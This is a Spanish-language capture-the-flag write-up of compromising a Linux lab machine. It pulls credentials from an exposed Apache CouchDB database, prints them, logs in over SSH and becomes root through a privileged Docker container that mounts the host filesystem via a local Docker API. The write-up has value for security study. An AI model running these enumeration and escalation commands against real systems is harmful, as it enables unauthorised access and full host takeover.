# Couch

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux explotando una instancia de **Apache CouchDB**, obtener credenciales válidas para acceder mediante **SSH** y escalar privilegios aprovechando una **Docker API** expuesta localmente para conseguir acceso como **root**.

---

## 🛠️ Tecnologías trabajadas

- Apache CouchDB
- SSH
- Docker
- Docker API
- CouchDB REST API
- SUID Enumeration

---

## 🧠 Metodología

La enumeración inicial mostró únicamente dos servicios expuestos: **SSH** y **Apache CouchDB**. Al no disponer de credenciales para SSH, el objetivo principal fue investigar el servicio CouchDB.

En lugar de buscar vulnerabilidades complejas desde el principio, comencé revisando la interfaz administrativa y los recursos que CouchDB expone por defecto. La propia aplicación proporcionaba acceso a información suficiente para identificar credenciales válidas sin necesidad de explotar ninguna vulnerabilidad específica.

Tras obtener acceso al sistema mediante SSH, inicié la enumeración habitual comprobando permisos `sudo` y binarios SUID, descartando rápidamente ambos vectores al no ofrecer posibilidades de escalada.

Continuando con la revisión del sistema encontré información especialmente útil dentro del historial de comandos del usuario. Dicho historial revelaba el uso de una **Docker API** accesible únicamente desde localhost. Comprendí que esa API permitía crear contenedores privilegiados montando el sistema de archivos del host, lo que proporcionaba una vía directa para obtener privilegios de **root**.

Este laboratorio demuestra la importancia de revisar cuidadosamente los artefactos que deja un usuario en el sistema, ya que un simple historial de comandos puede revelar la infraestructura interna y exponer vectores de escalada críticos.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un escaneo completo mediante Nmap.

```bash
nmap -p- 10.130.147.135
```

Los servicios detectados fueron:

| Puerto | Servicio |
|---------|----------|
| 22 | SSH |
| 5984 | Apache CouchDB |

Posteriormente realicé una enumeración más detallada.

```bash
nmap -sC -sV -p22,5984 10.130.147.135
```

La información confirmó que el servicio expuesto correspondía a:

- Apache CouchDB 1.6.1

---

### 2. Enumeración de CouchDB

Accedí al servicio web de CouchDB.

```text
http://10.130.147.135:5984
```

Posteriormente exploré la interfaz administrativa.

```text
http://10.130.147.135:5984/_utils
```

Desde ella fue posible consultar las bases de datos existentes utilizando:

```text
http://10.130.147.135:5984/_all_dbs
```

Durante la revisión de la información almacenada encontré las siguientes credenciales válidas:

```
Usuario: atena

Contraseña: t4qfzcc4qN##
```

---

### 3. Acceso inicial

Con las credenciales obtenidas inicié sesión mediante SSH.

```bash
ssh atena@10.130.147.135
```

Una vez dentro del sistema recuperé la primera flag ubicada en:

```
user.txt
```

---

### 4. Enumeración interna

Comencé revisando los permisos disponibles.

```bash
sudo -l
```

No existían permisos útiles para escalar privilegios.

Posteriormente enumeré los binarios SUID.

```bash
find / -perm -u=s -type f 2>/dev/null
```

Todos los binarios encontrados eran estándar y no proporcionaban una vía de explotación.

Continuando con la revisión del directorio personal encontré un archivo especialmente interesante:

```
.bash_history
```

Al consultar su contenido apareció el siguiente comando:

```bash
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
```

Este comando revelaba que la máquina disponía de una **Docker API** accesible localmente.

---

### 5. Escalada de privilegios

La Docker API permitía crear contenedores privilegiados montando el sistema de archivos completo del host.

Ejecuté el mismo comando encontrado en el historial:

```bash
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
```

El contenedor se inició con privilegios elevados y acceso al sistema de archivos del host, proporcionando control total sobre la máquina.

Finalmente recuperé la última flag ubicada en:

```
root.txt
```

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió practicar una cadena de explotación basada en una mala configuración de servicios y una exposición insegura de Docker.
- Enumerar servicios de **Apache CouchDB** mediante su interfaz web.
- Utilizar los recursos administrativos de CouchDB para localizar información sensible.
- Obtener credenciales válidas directamente desde una base de datos.
- Revisar sistemáticamente archivos de configuración e historiales de comandos durante la post-explotación.
- Comprender el funcionamiento de la **Docker Remote API**.
- Escalar privilegios creando contenedores privilegiados que montan el sistema de archivos del host.
